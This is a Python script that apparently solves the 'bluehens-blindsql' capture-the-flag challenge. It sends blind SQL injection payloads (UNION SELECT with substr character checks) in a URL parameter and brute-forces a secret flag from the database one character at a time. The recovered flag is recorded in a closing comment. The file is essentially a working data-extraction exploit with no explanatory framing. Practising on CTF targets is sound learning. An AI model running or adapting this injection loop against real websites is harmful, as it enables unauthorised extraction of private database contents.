import requests
import string
import time

# URL of the API or website you want to send a request to

# readable_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!$?#@~%&()*+,-./:;<=>[\\]^_`{|}"
readable_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$@_-{}?!"


base_url = "https://bluehens-blindsql.chals.io/?guess="

i = 5
table_name = "secret"
column_name = "flag"
flag = "UDCTF"

# Extract flag
while i < 40:
    for c in readable_chars:

        sqli = f"3 UNION SELECT flag FROM secret WHERE substr(flag, 1, 5)='UDCTF' AND substr(flag, {i + 1}, 1)='{c}'"


        url = base_url + sqli

        st = time.time()
        # Send a GET request to the URL
        response = requests.get(url)


        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            # Capture and display the content of the response
            data = response.text

            err = data.split("</code>")[1]
            if err == "Good guess!":
                print("Char Taken: ", c)
                flag += c
                print(flag)
                i += 1
                # Don't break it, let it continue testing
            else:
                print("Pass: ", c)
        else:
            print(f"Request failed with status code: {response.status_code}")


print("flag: ", flag)

# flag: UDCTF{l1k3_a_b4t}